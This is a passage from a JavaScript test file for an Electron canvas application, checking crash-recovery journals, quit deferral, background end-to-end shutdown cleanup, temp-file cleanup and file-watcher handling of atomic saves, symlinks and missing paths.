import { EventEmitter } from 'node:events';
import { pathToFileURL } from 'node:url';
import { getRecentLogs } from '../../electron/logger.js';
import { createPendingGlobalQuitDeferral } from '../../electron/utils/quitDeferral.js';
import {
  abortNodeTasks,
  abortNodeTasksAndWait,
  __recoveryRebindJournalForTests,
  assert,
  assertDeleteTargetNotRepresented,
  atomicWriteFile,
  BACKGROUND_E2E_DISABLED_CODE,
  BACKGROUND_E2E_SHUTDOWN_TIMEOUT_MS,
  backgroundE2EDisabledError,
  buildResumeDocument,
  cleanupStaleOwnedTempFiles,
  createFileWatchRegistry,
  electronPkg,
  fs,
  handleSafe,
  isTrustedCanvasNavigation,
  isBackgroundE2E,
  JSDOM,
  os,
  path,
  readValidatedTextFile,
  registerFilesystemHandlers,
  resolveAllowedOpenFilePath,
  resolvePortableFilePaths,
  sanitizeDocumentMainHtml,
  runBackgroundE2EShutdownCleanup,
  snapshotActiveNodeTasks,
  syncTextParentDirectory,
  validateMutablePath,
  writeValidatedTextFile,
} from '../test-dependencies.js';

function senderEvent() {
  const sender = new EventEmitter();
  sender.id = senderEvent.nextId++;
  sender.isDestroyed = () => false;
  return { sender };
}
senderEvent.nextId = 1;

const waitFor = async (predicate, description, timeoutMs = 3000) => {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (predicate()) return;
    await new Promise(resolve => setTimeout(resolve, 20));
  }
  throw new Error(`Timed out waiting for ${description}`);
};

export default [
  {
    name: 'recovery rebind journals reject unsafe slots and reconcile old/new launch paths deterministically',
    run: async () => {
      const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'ic-rebind-journal-'));
      const oldCanvas = path.join(root, 'before.json');
      const finderCanvas = path.join(root, 'finder.json');
      const saveAsCanvas = path.join(root, 'save-as.json');
      const crossDirectory = path.join(root, 'other');
      const crossCanvas = path.join(crossDirectory, 'moved.json');
      const staleLaunchCanvas = path.join(root, 'last-opened.json');
      const adoptedLaunchCanvas = path.join(root, 'adopted.json');
      const oldBytes = Buffer.from('{"version":1}\n');
      const nextBytes = Buffer.from('{"version":2}\n');
      const digest = async (bytes) => (await import('node:crypto')).createHash('sha256').update(bytes).digest('hex');
      try {
        await fs.promises.writeFile(finderCanvas, oldBytes);
        const finderStat = await fs.promises.lstat(finderCanvas);
        const finderJournals = __recoveryRebindJournalForTests.recoveryRebindJournalPaths(oldCanvas, finderCanvas);
        for (const journalPath of finderJournals) await __recoveryRebindJournalForTests.writeRecoveryRebindJournal(journalPath, {
          version: 1, oldCanvasPath: oldCanvas, newCanvasPath: finderCanvas, phase: 'prepared',
          canvasDigest: await digest(nextBytes), previousTargetDigest: await digest(oldBytes),
          renameAttestation: { dev: finderStat.dev, ino: finderStat.ino },
        });
        const finder = await __recoveryRebindJournalForTests.reconcileRecoveryRebindJournalForCanvas(finderCanvas);
        assert(finder.reconciled === true && finder.finderRename === true
          && !(await Promise.all(finderJournals.map(file => fs.promises.access(file).then(() => true, () => false)))).some(Boolean),
          'an attested Finder rename recovers sidecar ownership even when a crash occurred before the updated canvas snapshot published');

        await fs.promises.mkdir(crossDirectory);
        await fs.promises.writeFile(oldCanvas, oldBytes);
        await fs.promises.writeFile(crossCanvas, nextBytes);
        const crossJournals = __recoveryRebindJournalForTests.recoveryRebindJournalPaths(oldCanvas, crossCanvas);
        // A crash can leave only the source-directory copy. Opening the old
        // spelling must still discover and finish the exact target migration.
        await __recoveryRebindJournalForTests.writeRecoveryRebindJournal(crossJournals[1], {
          version: 1, oldCanvasPath: oldCanvas, newCanvasPath: crossCanvas, phase: 'canvas-written',
          canvasDigest: await digest(nextBytes), previousTargetDigest: null,
        });
        const cross = await __recoveryRebindJournalForTests.reconcileRecoveryRebindJournalForCanvas(oldCanvas);
        assert(cross.reconciled === true && !(await fs.promises.access(crossJournals[1]).then(() => true, () => false)),
          'the source-path app launch must reconcile a cross-directory journal whose target snapshot was already published');

        const workspaceBytes = Buffer.from('{"nodes":[]}\n');
        await fs.promises.writeFile(staleLaunchCanvas, workspaceBytes);
        const staleStat = await fs.promises.lstat(staleLaunchCanvas);
        await fs.promises.rename(staleLaunchCanvas, adoptedLaunchCanvas);
        const loadJournals = __recoveryRebindJournalForTests.recoveryRebindJournalPaths(staleLaunchCanvas, adoptedLaunchCanvas);
        for (const journalPath of loadJournals) await __recoveryRebindJournalForTests.writeRecoveryRebindJournal(journalPath, {
          version: 1, oldCanvasPath: staleLaunchCanvas, newCanvasPath: adoptedLaunchCanvas, phase: 'prepared',
          canvasDigest: await digest(workspaceBytes), previousTargetDigest: null,
          renameAttestation: { dev: staleStat.dev, ino: staleStat.ino },
        });
        electronPkg.ipcMain.__clearInvokeHandlers();
        registerFilesystemHandlers();
        const loadWorkspace = electronPkg.ipcMain.__getInvokeHandler('load-workspace');
        const loaded = await loadWorkspace(senderEvent(), { filePath: staleLaunchCanvas });
        assert(loaded?.filePath === adoptedLaunchCanvas && Array.isArray(loaded?.data?.nodes),
          'opening a stale last-opened spelling must adopt only the journal-attested new canvas before reading it');

        const unsafeJournal = __recoveryRebindJournalForTests.recoveryRebindJournalPath(oldCanvas, finderCanvas);
        const symlinkTarget = path.join(root, 'journal-target.txt');
        await fs.promises.writeFile(symlinkTarget, 'keep');
        await fs.promises.symlink(symlinkTarget, unsafeJournal);
        let unsafeRejected = false;
        try {
          await __recoveryRebindJournalForTests.writeRecoveryRebindJournal(unsafeJournal, {
            version: 1, oldCanvasPath: oldCanvas, newCanvasPath: finderCanvas, phase: 'prepared',
            canvasDigest: await digest(nextBytes), previousTargetDigest: null,
          });
        } catch { unsafeRejected = true; }
        assert(unsafeRejected && (await fs.promises.readFile(symlinkTarget, 'utf8')) === 'keep',
          'journal publication must reject a deterministic symlink slot without following or replacing it');
        await fs.promises.unlink(unsafeJournal);

        await fs.promises.writeFile(saveAsCanvas, oldBytes);
        const saveAsJournals = __recoveryRebindJournalForTests.recoveryRebindJournalPaths(oldCanvas, saveAsCanvas);
        for (const journalPath of saveAsJournals) await __recoveryRebindJournalForTests.writeRecoveryRebindJournal(journalPath, {
          version: 1, oldCanvasPath: oldCanvas, newCanvasPath: saveAsCanvas, phase: 'prepared',
          canvasDigest: await digest(nextBytes), previousTargetDigest: await digest(oldBytes),
        });
        const saveAs = await __recoveryRebindJournalForTests.reconcileRecoveryRebindJournalForCanvas(saveAsCanvas);
        assert(saveAs.rolledBack === true && (await fs.promises.readFile(saveAsCanvas, 'utf8')) === oldBytes.toString('utf8'),
          'a preexisting unrelated Save As target only clears its prepared journal and is never adopted as another canvas');
        return { finderReconciled: finder.finderRename, sourceLaunchReconciled: cross.reconciled, staleLaunchAdopted: loaded.filePath === adoptedLaunchCanvas, unsafeRejected, saveAsRolledBack: saveAs.rolledBack };
      } finally {
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'global quit deferred behind a window close resumes once, but cancel or save failure consumes it',
    run: () => {
      const deferral = createPendingGlobalQuitDeferral();
      assert(!deferral.isPending() && !deferral.consumeAfterClose(true),
        'a normal successful close must not invent an app-wide quit');

      deferral.defer();
      assert(deferral.isPending() && !deferral.consumeAfterClose(false) && !deferral.isPending(),
        'a cancelled/failed window close must consume a concurrent Cmd+Q instead of leaving a stale later quit');

      deferral.defer();
      assert(deferral.consumeAfterClose(true) && !deferral.isPending()
        && !deferral.consumeAfterClose(true),
      'a successful window close must resume exactly one deferred global quit without a duplicate retrigger');
      return { failedCloseDoesNotQuit: true, successfulCloseResumesOnce: true };
    },
  },
  {
    name: 'background E2E mode has a stable opt-in flag, disabled error, and bounded non-UI cleanup',
    run: async () => {
      assert(isBackgroundE2E({ INFINITE_CANVAS_E2E_BACKGROUND: '1' }),
        'the explicit background flag must enable safety mode');
      assert(!isBackgroundE2E({ INFINITE_CANVAS_E2E_BACKGROUND: '0' }),
        'non-enabled values must leave safety mode off');
      assert(!isBackgroundE2E({}), 'a missing flag must leave safety mode off');
      assert(!isBackgroundE2E(null), 'a missing environment object must leave safety mode off');

      const error = backgroundE2EDisabledError('Native login window');
      assert(error instanceof Error, 'the blocked operation must return an Error');
      assert(error.code === BACKGROUND_E2E_DISABLED_CODE,
        `blocked operations must use ${BACKGROUND_E2E_DISABLED_CODE}`);
      assert(error.message === 'Native login window is disabled during the background Electron smoke test.',
        'the blocked-operation message must remain stable for callers and regressions');

      const calls = [];
      const settled = await runBackgroundE2EShutdownCleanup({
        closeAllAuthWindows: async () => { calls.push('auth'); throw new Error('auth close failure'); },
        closeAllPages: async () => { calls.push('pages'); },
        closeStealthBrowser: async (forShutdown) => { calls.push(`stealth:${forShutdown}`); },
        stopApplicationSyncServer: async () => { calls.push('sync'); },
        timeoutMs: 100,
      });
      assert(!settled.timedOut && calls.length === 4
        && calls.includes('auth') && calls.includes('pages')
        && calls.includes('stealth:true') && calls.includes('sync'),
      'background cleanup must attempt every independent closer even if one rejects');

      const timedOut = await runBackgroundE2EShutdownCleanup({
        closeAllAuthWindows: () => new Promise(() => {}),
        closeAllPages: async () => {},
        closeStealthBrowser: async () => {},
        stopApplicationSyncServer: async () => {},
        timeoutMs: 5,
      });
      assert(timedOut.timedOut, 'background cleanup must return at its finite timeout');

      const [mainSource, smokeSource] = await Promise.all([
        fs.promises.readFile(path.resolve('electron/main.js'), 'utf8'),
        fs.promises.readFile(path.resolve('scripts/electron-smoke.js'), 'utf8'),
      ]);
      assert(/if \(isBackgroundE2E\) \{[\s\S]*?event\.preventDefault\(\);[\s\S]*?if \(backgroundE2ECleanupInFlight\) return;[\s\S]*?isQuitting = true;[\s\S]*?backgroundE2ECleanupInFlight = runBackgroundE2EShutdownCleanup\(\{[\s\S]*?closeAllAuthWindows,[\s\S]*?closeAllPages,[\s\S]*?closeStealthBrowser,[\s\S]*?stopApplicationSyncServer,[\s\S]*?\}\);[\s\S]*?await backgroundE2ECleanupInFlight;[\s\S]*?app\.exit\(0\);/.test(mainSource),
        'background before-quit must suppress every re-entry until bounded cleanup has completed and app.exit owns termination');
      assert(/if \(isQuitting\) \{\s*event\.preventDefault\(\);\s*return;\s*\}/.test(mainSource),
        'the production-only quit branch must suppress re-entrant default termination while cleanup owns shutdown');
      assert(smokeSource.includes('BACKGROUND_E2E_SHUTDOWN_TIMEOUT_MS + 5_000'),
        'smoke teardown must outwait the bounded background cleanup window');
      assert(smokeSource.includes('app.close()') && !smokeSource.includes("electronProcess.kill('SIGTERM')"),
        'smoke teardown must use Electron app.quit lifecycle cleanup instead of relying on SIGTERM');
      return { code: error.code, enabledOnlyByExplicitFlag: true, cleanupTimeoutMs: BACKGROUND_E2E_SHUTDOWN_TIMEOUT_MS };
    },
  },
  {
    name: 'directory document watcher survives repeated atomic saves and direct writes',
    run: async () => {
      const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'ic-directory-watch-'));
      const documentPath = path.join(root, 'notes.md');
      const event = senderEvent();
      const changes = [];
      event.sender.send = (channel, changedPath) => changes.push({ channel, changedPath });
      const registry = createFileWatchRegistry({ pollInterval: 20, onError: () => {} });
      try {
        await fs.promises.writeFile(documentPath, 'zero');
        await registry.start(event.sender, documentPath);

        await atomicWriteFile(documentPath, 'one');
        await waitFor(() => changes.length >= 1, 'the first atomic replacement');
        const afterFirstAtomic = changes.length;

        await atomicWriteFile(documentPath, 'two');
        await waitFor(() => changes.length > afterFirstAtomic, 'the second atomic replacement');
        const afterSecondAtomic = changes.length;

        await fs.promises.writeFile(documentPath, 'three');
        await waitFor(() => changes.length > afterSecondAtomic, 'a direct write after atomic replacements');

        assert(changes.every(({ channel, changedPath }) => channel === 'file-changed' && changedPath === documentPath),
          `only the watched path should be broadcast, got ${JSON.stringify(changes)}`);
        return { notifications: changes.length, repeatedAtomicSavesObserved: true, directWriteObserved: true };
      } finally {
        registry.stop(event.sender, documentPath);
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'healthy native document watchers retain a low-frequency verification poll',
    run: async () => {
      const event = senderEvent();
      const changes = [];
      event.sender.send = (_channel, changedPath) => changes.push(changedPath);
      const documentPath = '/tmp/verification-poll.md';
      const watchers = [];
      const polls = [];
      const unpolled = [];
      const registry = createFileWatchRegistry({
        watch: (_watchedPath, callback) => {
          const watcher = new EventEmitter();
          watcher.callback = callback;
          watcher.close = () => {};
          watchers.push(watcher);
          return watcher;
        },
        watchFile: (watchedPath, options, callback) => polls.push({ watchedPath, options, callback }),
        unwatchFile: (watchedPath, callback) => unpolled.push({ watchedPath, callback }),
        access: async () => {},
        realpath: async (candidate) => candidate,
        verificationInterval: 12_345,
        onError: () => {},
      });
      await registry.start(event.sender, documentPath);
      await registry.start(event.sender, documentPath);
      assert(watchers.length === 1 && polls.length === 1
        && polls[0].watchedPath === documentPath && polls[0].options.interval === 12_345,
      'a live native watcher must retain exactly one low-frequency stat verifier per shared path');

      polls[0].callback(
        { mtimeMs: 4, ctimeMs: 5, size: 6, ino: 7, nlink: 1 },
        { mtimeMs: 1, ctimeMs: 2, size: 3, ino: 7, nlink: 1 },
      );
      assert(changes.length === 1 && changes[0] === documentPath,
        'a verifier-detected silent change must broadcast while native watch remains healthy');
      registry.stop(event.sender, documentPath);
      assert(unpolled.length === 0,
        'one remaining refcount must retain the verification poll');
      registry.stop(event.sender, documentPath);
      assert(unpolled.length === 1 && unpolled[0].watchedPath === documentPath,
        'final unsubscribe must release the low-frequency verification poll');
      return { verificationPollObserved: true, refcountedCleanup: true };
    },
  },
  {
    name: 'stale owned text temps are cleaned without touching fresh files or symlinks',
    run: async () => {
      const root = '/tmp/ic-temp-cleanup';
      const staleText = '.__ic_text_123e4567-e89b-12d3-a456-426614174000.tmp';
      const freshText = '.__ic_text_123e4567-e89b-12d3-a456-426614174001.tmp';
      const staleAtomic = 'canvas.json.__ic_atomic_123e4567-e89b-12d3-a456-426614174002.tmp';
      const staleSymlink = '.__ic_text_123e4567-e89b-12d3-a456-426614174003.tmp';
      const staleActive = '.__ic_text_123e4567-e89b-12d3-a456-426614174004.tmp';
      const unrelated = 'notes.tmp';
      const nowMs = 10_000_000;
      const files = [staleText, freshText, staleAtomic, staleSymlink, staleActive, unrelated];
      const removed = [];
      await cleanupStaleOwnedTempFiles(root, {
        readdir: async () => files,
        lstat: async (candidate) => {
          const name = path.basename(candidate);
          const fresh = name === freshText;
          const symlink = name === staleSymlink;
          return {
            mtimeMs: fresh ? nowMs - 1_000 : nowMs - 3_700_000,
            isFile: () => !symlink,
            isSymbolicLink: () => symlink,
          };
        },
        unlink: async candidate => { removed.push(path.basename(candidate)); },
        now: () => nowMs,
        maxAgeMs: 3_600_000,
        isActivePath: candidate => path.basename(candidate) === staleActive,
      });
      assert(removed.includes(staleText) && removed.includes(staleAtomic)
        && !removed.includes(freshText) && !removed.includes(staleSymlink)
        && !removed.includes(staleActive)
        && !removed.includes(unrelated),
      `only stale regular app temps may be removed, got ${JSON.stringify(removed)}`);
      return { removed: removed.sort(), freshAndSymlinkSafe: true };
    },
  },
  {
    name: 'shared document watcher refcounts subscriptions and ignores stale watcher callbacks',
    run: async () => {
      const event = senderEvent();
      const sent = [];
      event.sender.send = (channel, changedPath) => sent.push({ channel, changedPath });
      const watchers = [];
      const watch = (watchedPath, callback) => {
        const watcher = new EventEmitter();
        watcher.watchedPath = watchedPath;
        watcher.callback = callback;
        watcher.closed = false;
        watcher.close = () => { watcher.closed = true; };
        watchers.push(watcher);
        return watcher;
      };
      const documentPath = '/tmp/shared-notes.md';
      const registry = createFileWatchRegistry({
        watch,
        access: async () => {},
        realpath: async (candidate) => candidate,
        onError: () => {},
        retryMs: 5,
      });

      await registry.start(event.sender, documentPath);
      await registry.start(event.sender, documentPath);
      assert(watchers.length === 1 && watchers[0].watchedPath === path.dirname(documentPath),
        'same-path clients must share one parent-directory watcher');
      watchers[0].callback('change', path.basename(documentPath));
      assert(sent.length === 1, 'a sender with two subscriptions must receive one broadcast per change');

      registry.stop(event.sender, documentPath);
      watchers[0].callback('change', path.basename(documentPath));
      assert(sent.length === 2 && !watchers[0].closed,
        'one remaining subscription must keep the shared watcher live');

      watchers[0].emit('error', new Error('transient watcher failure'));
      await waitFor(() => watchers.length === 2, 'watcher reattachment after an error', 500);
      const afterErrorRefresh = sent.length;
      watchers[0].callback('change', path.basename(documentPath));
      assert(sent.length === afterErrorRefresh, 'a stale watcher callback must not broadcast after reattachment');
      watchers[1].callback('change', path.basename(documentPath));
      assert(sent.length === afterErrorRefresh + 1, 'the replacement watcher must retain the live subscription');

      registry.stop(event.sender, documentPath);
      assert(watchers[1].closed, 'final unsubscribe must close the replacement watcher');
      return { sharedWatcher: true, staleCallbackIgnored: true };
    },
  },
  {
    name: 'document watcher follows a canonical target behind an alias',
    run: async () => {
      const event = senderEvent();
      const sent = [];
      event.sender.send = (channel, changedPath) => sent.push({ channel, changedPath });
      const nativeWatchers = [];
      let polledPath = null;
      let pollListener = null;
      let unpolledPath = null;
      const aliasPath = '/links/shortcut-name.md';
      const targetPath = '/documents/actual-target-name.md';
      const watch = (watchedPath, callback) => {
        const watcher = new EventEmitter();
        watcher.watchedPath = watchedPath;
        watcher.callback = callback;
        watcher.closed = false;
        watcher.close = () => { watcher.closed = true; };
        nativeWatchers.push(watcher);
        return watcher;
      };
      const registry = createFileWatchRegistry({
        watch,
        access: async () => {},
        realpath: async (candidate) => {
          assert(candidate === aliasPath, 'only the renderer alias should be resolved during startup');
          return targetPath;
        },
        watchFile: (watchedPath, _options, callback) => {
          polledPath = watchedPath;
          pollListener = callback;
        },
        unwatchFile: (watchedPath) => { unpolledPath = watchedPath; },
        onError: () => {},
        retryMs: 50,
      });

      await registry.start(event.sender, aliasPath);
      assert(nativeWatchers.length === 2
        && nativeWatchers[0].watchedPath === path.dirname(targetPath),
      'the native watcher must attach to the canonical target directory, not the alias directory');
      assert(nativeWatchers[1].watchedPath === path.dirname(aliasPath),
        'a final symlink must also watch its lexical parent for retargeting');

      // Target atomic replacements surface as rename events for the target
      // basename. The alias spelling must never leak into the native filter,
      // but must remain the renderer-facing broadcast value.
      nativeWatchers[0].callback('rename', path.basename(targetPath));
      nativeWatchers[0].callback('rename', path.basename(targetPath));
      assert(sent.length === 2 && sent.every(({ channel, changedPath }) => channel === 'file-changed' && changedPath === aliasPath),
        'repeated atomic saves of the target must notify the alias subscriber using its original path');
      nativeWatchers[0].callback('rename', path.basename(aliasPath));
      assert(sent.length === 2, 'a same-named alias-directory event must not be mistaken for the canonical target');

      // The error path must poll the same canonical target and retain the
      // original alias in broadcasts/unsubscription bookkeeping.
      nativeWatchers[0].emit('error', new Error('force polling fallback'));
      assert(polledPath === targetPath && typeof pollListener === 'function',
        'the polling fallback must follow the canonical target after native-watch failure');
      const beforePoll = sent.length;
      pollListener(
        { mtimeMs: 2, size: 2, ino: 2, nlink: 1 },
        { mtimeMs: 1, size: 1, ino: 1, nlink: 1 },
      );
      assert(sent.length === beforePoll + 1 && sent.at(-1).changedPath === aliasPath,
        'a canonical-target polling change must still notify the alias subscriber');

      registry.stop(event.sender, aliasPath);
      assert(unpolledPath === targetPath,
        'stopping an alias subscription must clean up its canonical polling target');
      return { canonicalDirectory: nativeWatchers[0].watchedPath, aliasNotifications: sent.length, fallbackPolled: polledPath };
    },
  },
  {
    name: 'final symlink watcher follows retargets and cleans stale alias callbacks',
    run: async () => {
      const event = senderEvent();
      const sent = [];
      event.sender.send = (_channel, changedPath) => sent.push(changedPath);
      const aliasPath = '/links/shortcut.md';
      const firstTarget = '/documents/first.md';
      const secondTarget = '/replacement/second.md';
      let currentTarget = firstTarget;
      const watchers = [];
      const watch = (watchedPath, callback) => {
        const watcher = new EventEmitter();
        watcher.watchedPath = watchedPath;
        watcher.callback = callback;
        watcher.closed = false;
        watcher.close = () => { watcher.closed = true; };
        watchers.push(watcher);
        return watcher;
      };
      const registry = createFileWatchRegistry({
        watch,
        access: async () => {},
        realpath: async (candidate) => candidate === aliasPath ? currentTarget : candidate,
        onError: () => {},
        retryMs: 5,
      });
      try {
        await registry.start(event.sender, aliasPath);
        const firstTargetWatcher = watchers[0];
        const firstAliasWatcher = watchers[1];
        assert(firstTargetWatcher.watchedPath === path.dirname(firstTarget)
          && firstAliasWatcher.watchedPath === path.dirname(aliasPath),
        'a final symlink must start target and lexical-parent watchers');

        firstTargetWatcher.callback('change', path.basename(firstTarget));
        assert(sent.length === 1 && sent[0] === aliasPath,
          'changes to the first target must retain the lexical renderer path');

        firstAliasWatcher.emit('error', new Error('transient alias watcher failure'));
        await waitFor(() => watchers.length === 3, 'alias watcher reattachment after error', 500);
        firstAliasWatcher.callback('rename', path.basename(aliasPath));
        assert(sent.length === 1,
          'a stale lexical watcher callback must not rebind or broadcast after replacement');

        const liveAliasWatcher = watchers[2];
        currentTarget = secondTarget;
        liveAliasWatcher.callback('rename', path.basename(aliasPath));
        await waitFor(() => watchers.some(watcher => watcher.watchedPath === path.dirname(secondTarget)),
          'target watcher rebind after alias retarget', 500);
        const secondTargetWatcher = watchers.at(-1);
        assert(firstTargetWatcher.closed,
          'retargeting must detach the old canonical target watcher');

        const beforeOldTarget = sent.length;
        firstTargetWatcher.callback('change', path.basename(firstTarget));
        assert(sent.length === beforeOldTarget,
          'the old target must not notify after the alias has moved');
        secondTargetWatcher.callback('change', path.basename(secondTarget));
        assert(sent.length === beforeOldTarget + 1 && sent.at(-1) === aliasPath,
          'the new target must notify the original lexical path');

        registry.stop(event.sender, aliasPath);
        const beforeStopStale = sent.length;
        liveAliasWatcher.callback('rename', path.basename(aliasPath));
        secondTargetWatcher.callback('change', path.basename(secondTarget));
        assert(sent.length === beforeStopStale && liveAliasWatcher.closed && secondTargetWatcher.closed,
          'stop must close both live watchers and ignore later stale callbacks');
        return { targetRetargeted: true, staleAliasIgnored: true, oldTargetDetached: true };
      } finally {
        registry.stop(event.sender, aliasPath);
      }
    },
  },
  {
    name: 'missing lexical path binds on creation and stops cleanly before creation',
    run: async () => {
      const documentPath = '/missing/new-notes.md';
      const event = senderEvent();
      const sent = [];
      event.sender.send = (_channel, changedPath) => sent.push(changedPath);
      let exists = false;
      const watchers = [];
      const missingError = () => Object.assign(new Error('missing'), { code: 'ENOENT' });
      const watch = (watchedPath, callback) => {
        const watcher = new EventEmitter();
        watcher.watchedPath = watchedPath;
        watcher.callback = callback;
        watcher.closed = false;
        watcher.close = () => { watcher.closed = true; };
        watchers.push(watcher);
        return watcher;
      };
      const registry = createFileWatchRegistry({
        watch,
        access: async () => { if (!exists) throw missingError(); },
        realpath: async (candidate) => {
          if (!exists) throw missingError();
          return candidate;
        },
        onError: () => {},
      });
      try {
        await registry.start(event.sender, documentPath);
        const lexicalWatcher = watchers[0];
        assert(lexicalWatcher?.watchedPath === path.dirname(documentPath),
          'an initially missing path must retain one exact lexical parent watcher');
        exists = true;
        lexicalWatcher.callback('rename', path.basename(documentPath));
        await waitFor(() => watchers.length === 2, 'target watcher binding after file creation', 500);
        assert(sent.length === 1 && sent[0] === documentPath && lexicalWatcher.closed,
          'creation must bind and notify the original path while replacing the temporary lexical watcher');
        registry.stop(event.sender, documentPath);
        const beforeStale = sent.length;
        lexicalWatcher.callback('rename', path.basename(documentPath));
        assert(sent.length === beforeStale && watchers[1].closed,
          'stopping after bind must close the target and ignore stale creation callbacks');

        const stoppedEvent = senderEvent();
        const stoppedWatchers = [];
        let stoppedExists = false;
        const stoppedRegistry = createFileWatchRegistry({
          watch: (watchedPath, callback) => {
            const watcher = new EventEmitter();
            watcher.watchedPath = watchedPath;
            watcher.callback = callback;
            watcher.closed = false;
            watcher.close = () => { watcher.closed = true; };
            stoppedWatchers.push(watcher);
            return watcher;
          },
          access: async () => { if (!stoppedExists) throw missingError(); },
          realpath: async (candidate) => {
            if (!stoppedExists) throw missingError();
            return candidate;
          },
          onError: () => {},
        });
        await stoppedRegistry.start(stoppedEvent.sender, documentPath);
        const stoppedLexicalWatcher = stoppedWatchers[0];
        stoppedRegistry.stop(stoppedEvent.sender, documentPath);
        stoppedExists = true;
        stoppedLexicalWatcher.callback('rename', path.basename(documentPath));
        assert(stoppedLexicalWatcher.closed && stoppedWatchers.length === 1,
          'stopping before creation must leave no lexical callback able to bind later');
        return { missingPathBound: true, stopBeforeCreateSafe: true };
      } finally {
        registry.stop(event.sender, documentPath);
      }
    },
  },
  {
    name: 'missing lexical symlink binds its target and retains alias monitoring',
    run: async () => {
      const aliasPath = '/links/created-later.md';
      const targetPath = '/targets/created-target.md';
      const event = senderEvent();
      event.sender.send = () => {};
      let exists = false;
      const watchers = [];
      const missingError = () => Object.assign(new Error('missing'), { code: 'ENOENT' });
      const registry = createFileWatchRegistry({
        watch: (watchedPath, callback) => {
          const watcher = new EventEmitter();
          watcher.watchedPath = watchedPath;
          watcher.callback = callback;
          watcher.closed = false;
          watcher.close = () => { watcher.closed = true; };
          watchers.push(watcher);
          return watcher;
        },
        access: async () => { if (!exists) throw missingError(); },
        realpath: async (candidate) => {
          if (!exists) throw missingError();
          return candidate === aliasPath ? targetPath : candidate;
        },
        onError: () => {},
      });
      try {
        await registry.start(event.sender, aliasPath);
        const lexicalWatcher = watchers[0];
        exists = true;
        lexicalWatcher.callback('rename', path.basename(aliasPath));
        await waitFor(() => watchers.length === 2, 'target watcher binding for created symlink', 500);
        assert(watchers[1].watchedPath === path.dirname(targetPath) && !lexicalWatcher.closed,
          'a symlink created after registration must bind its target while retaining lexical retarget monitoring');
        return { createdSymlinkBound: true, lexicalMonitorRetained: true };
      } finally {
        registry.stop(event.sender, aliasPath);
      }
    },
  },
  {
    name: 'missing lexical path uses polling fallback when its parent watcher cannot attach',
    run: async () => {
      const documentPath = '/missing/poll-created.md';
      const event = senderEvent();
      const sent = [];
      event.sender.send = (_channel, changedPath) => sent.push(changedPath);
      let exists = false;
      let nativeAttempts = 0;
      const polls = [];
      const missingError = () => Object.assign(new Error('missing'), { code: 'ENOENT' });
      const registry = createFileWatchRegistry({
        watch: () => {
          nativeAttempts += 1;
          throw new Error('native watcher unavailable');
        },
        watchFile: (watchedPath, _options, callback) => polls.push({ watchedPath, callback }),
        unwatchFile: () => {},
        access: async () => { if (!exists) throw missingError(); },
        realpath: async (candidate) => {
          if (!exists) throw missingError();
          return candidate;
        },
        onError: () => {},
        retryMs: 10_000,
      });
      try {
        await registry.start(event.sender, documentPath);
        assert(polls.length === 1 && polls[0].watchedPath === documentPath,
          'missing-path fallback must poll the lexical filename when native parent watching fails');
        exists = true;
        polls[0].callback(
          { mtimeMs: 1, ctimeMs: 1, size: 1, ino: 1, nlink: 1 },
          { mtimeMs: 0, ctimeMs: 0, size: 0, ino: 0, nlink: 0 },
        );
        await waitFor(() => sent.length === 1, 'poll-triggered missing path rebind', 500);
        assert(nativeAttempts >= 2 && sent[0] === documentPath,
          'a polling-detected creation must attempt target binding and notify the lexical path');
        return { lexicalPollingFallback: true, pollTriggeredRebind: true };
      } finally {
        registry.stop(event.sender, documentPath);
      }
    },
  },
  {
    name: 'lexical watcher post-attach probes close missing-create and alias-retarget races',
    run: async () => {
      const missingPath = '/racy/missing.md';
      const missingEvent = senderEvent();
      const missingSent = [];
      missingEvent.sender.send = (_channel, changedPath) => missingSent.push(changedPath);
      let missingExists = false;
      let missingWatchCalls = 0;
      const missingError = () => Object.assign(new Error('missing'), { code: 'ENOENT' });
      const missingRegistry = createFileWatchRegistry({
        watch: (watchedPath, callback) => {
          const watcher = new EventEmitter();
          watcher.watchedPath = watchedPath;
          watcher.callback = callback;
          watcher.close = () => {};
          if (++missingWatchCalls === 1) missingExists = true;
          return watcher;
        },
        access: async () => { if (!missingExists) throw missingError(); },
        realpath: async (candidate) => {
          if (!missingExists) throw missingError();
          return candidate;
        },
        onError: () => {},
      });
      try {
        await missingRegistry.start(missingEvent.sender, missingPath);
        await waitFor(() => missingWatchCalls === 2 && missingSent.length === 1,
          'post-attach rebind after creation inside lexical watch setup', 500);
        assert(missingSent[0] === missingPath,
          'a creation during lexical watcher setup must still notify its original path');
      } finally {
        missingRegistry.stop(missingEvent.sender, missingPath);
      }

      const aliasPath = '/racy-links/shortcut.md';
      const firstTarget = '/racy-targets/first.md';
      const secondTarget = '/racy-replacement/second.md';
      const aliasEvent = senderEvent();
      const aliasSent = [];
      aliasEvent.sender.send = (_channel, changedPath) => aliasSent.push(changedPath);
      let target = firstTarget;
      let aliasWatchAttached = false;
      const aliasRegistry = createFileWatchRegistry({
        watch: (watchedPath, callback) => {
          const watcher = new EventEmitter();
          watcher.watchedPath = watchedPath;
          watcher.callback = callback;
          watcher.close = () => {};
          if (watchedPath === path.dirname(aliasPath) && !aliasWatchAttached) {
            aliasWatchAttached = true;
            target = secondTarget;
          }
          return watcher;
        },
        access: async () => {},
        realpath: async (candidate) => candidate === aliasPath ? target : candidate,
        onError: () => {},
      });
      try {
        await aliasRegistry.start(aliasEvent.sender, aliasPath);
        await waitFor(() => aliasSent.length >= 1, 'post-attach rebind after alias retarget during setup', 500);
        assert(aliasSent.every(changedPath => changedPath === aliasPath),
          'an alias retarget during watcher setup must retain its lexical broadcast path');
        return { missingCreationRaceClosed: true, aliasRetargetRaceClosed: true };
      } finally {
        aliasRegistry.stop(aliasEvent.sender, aliasPath);
      }
    },
  },
  {
    name: 'fallback polling rebinds a direct path replaced by a symlink',
    run: async () => {
      const documentPath = '/fallback/direct.md';
      const targetPath = '/fallback-target/linked.md';
      const event = senderEvent();
      const sent = [];
      event.sender.send = (_channel, changedPath) => sent.push(changedPath);
      let currentTarget = documentPath;
      const watchedDirs = [];
      let targetPoll = null;
      const registry = createFileWatchRegistry({
        watch: (watchedPath) => {
          watchedDirs.push(watchedPath);
          throw new Error('force polling');
        },
        watchFile: (watchedPath, _options, callback) => {
          if (watchedPath === documentPath && !targetPoll) targetPoll = callback;
        },
        unwatchFile: () => {},
